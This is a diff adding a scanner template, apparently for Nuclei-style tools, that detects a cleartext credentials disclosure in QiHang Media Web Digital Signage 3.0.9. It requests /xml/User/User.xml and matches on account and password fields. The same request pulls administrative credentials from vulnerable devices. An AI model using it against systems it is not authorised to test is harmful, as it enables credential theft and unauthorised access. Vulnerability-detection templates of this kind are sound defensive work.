@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <?xml version
+          - <Users>
+          - account=
+          - password=
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/xml/User/User.xml'
+id: qihang-media-disclosure
+info:
+  author: gy741
+  description: QiHang Media Web Digital Signage 3.0.9 suffers from a clear-text credentials disclosure vulnerability that allows an unauthenticated attacker to issue a request to an unprotected directory that hosts an XML file /xml/User/User.xml and obtain administrative login information that allows for a successful authentication bypass attack.
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: QiHang Media Web Digital Signage 3.0.9 - Cleartext Credentials Disclosure
+  severity: high
+  tags: qihang,media,disclosure,argus-import
